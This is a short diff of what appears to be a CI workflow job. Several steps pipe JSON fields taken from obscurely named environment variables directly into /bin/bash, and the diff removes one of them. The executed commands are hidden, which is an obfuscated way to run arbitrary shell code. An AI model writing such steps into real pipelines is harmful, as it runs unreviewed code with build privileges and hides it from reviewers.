@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$oapij879" | jq -r .pmq8 | /bin/bash
           printf '%s' "$foty5" | jq -r .o59827 | /bin/bash
           echo $gpq38047 | jq -r .xdha831 | /bin/bash
-          echo $riy96 | jq -r .lcare371 | /bin/bash
           printf '%s' "$evevy84" | jq -r .pmhwi0478 | /bin/bash
 
       - name: Store output
